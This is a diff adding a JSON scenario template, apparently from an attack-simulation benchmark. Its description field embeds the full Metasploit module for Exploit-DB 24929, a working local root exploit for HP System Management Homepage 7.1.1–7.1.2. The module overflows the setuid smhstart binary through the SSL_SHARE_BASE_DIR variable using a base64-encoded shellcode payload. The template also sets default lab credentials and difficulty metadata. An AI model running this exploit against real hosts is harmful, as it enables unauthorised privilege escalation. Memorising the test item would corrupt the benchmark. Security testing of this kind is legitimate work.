@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_24929",
+  "category": "D1_credential",
+  "attack_technique": "T1552.001",
+  "cwe": "CWE-256",
+  "description": "Linux privilege escalation: HP System Management Homepage - Local Privilege Escalation (Metasploit) (OSVDB-91990)\n\nExploit source code (24929.rb):\n```\n##\n# This file is part of the Metasploit Framework and may be subject to\n# redistribution and commercial restrictions. Please see the Metasploit\n# web site for more information on licensing and terms of use.\n#   http://metasploit.com/\n##\n\nrequire 'msf/core'\nrequire 'rex'\nrequire 'msf/core/post/common'\nrequire 'msf/core/exploit/local/linux'\nrequire 'msf/core/exploit/exe'\n\nclass Metasploit4 < Msf::Exploit::Local\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Post::Common\n\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info={})\n    super( update_info( info, {\n        'Name'          => 'HP System Management Homepage Local Privilege Escalation',\n        'Description'   => %q{\n            Versions of HP System Management Homepage <= 7.1.2 include a setuid root\n          smhstart which is vulnerable to a local buffer overflow in SSL_SHARE_BASE_DIR\n          env variable.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        =>\n          [\n            'agix' # @agixid # Vulnerability discovery and Metasploit module\n          ],\n        'Platform'      => [ 'linux' ],\n        'Arch'          => [ ARCH_X86 ],\n        'SessionTypes'  => [ 'shell' ],\n        'Payload'    =>\n          {\n            'Space'     => 227,\n            'BadChars'   => \"\\x00\\x22\"\n          },\n        'References'    =>\n          [\n            ['OSVDB', '91990']\n          ],\n        'Targets'       =>\n          [\n            [ 'HP System Management Homepage 7.1.1',\n              {\n                'Arch' => ARCH_X86,\n                'CallEsp' => 0x080c86eb, # call esp\n                'Offset' => 58\n              }\n            ],\n            [ 'HP System Management Homepage 7.1.2',\n              {\n                'Arch' => ARCH_X86,\n                'CallEsp' => 0x080c8b9b, # call esp\n                'Offset' => 58\n              }\n            ],\n          ],\n        'DefaultOptions' =>\n          {\n            'PrependSetuid'    => true\n          },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => \"Mar 30 2013\",\n      }\n      ))\n    register_options([\n        OptString.new(\"smhstartDir\", [ true, \"smhstart directory\", \"/opt/hp/hpsmh/sbin/\" ])\n      ], self.class)\n  end\n\n  def exploit\n    pl = payload.encoded\n    padding = rand_text_alpha(target['Offset'])\n    ret = [target['CallEsp']].pack('V')\n    exploit =  pl\n    exploit << ret\n    exploit << \"\\x81\\xc4\\x11\\xff\\xff\\xff\"   # add esp, 0xffffff11\n    exploit << \"\\xe9\\x0e\\xff\\xff\\xff\"    # jmp => begining of pl\n    exploit << padding\n    exploit_encoded = Rex::Text.encode_base64(exploit) # to not break the shell base64 is better\n    id=cmd_exec(\"id -un\")\n    if id!=\"hpsmh\"\n      fail_with(Exploit::Failure::NoAccess, \"You are #{id}, you must be hpsmh to exploit this\")\n    end\n    cmd_exec(\"export SSL_SHARE_BASE_DIR=$(echo -n '#{exploit_encoded}' | base64 -d)\")\n    cmd_exec(\"#{datastore['smhstartDir']}/smhstart\")\n  end\n\nend\n```",
+  "cve": "OSVDB-91990",
+  "exploitdb_id": "24929",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_24929",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ]
+}
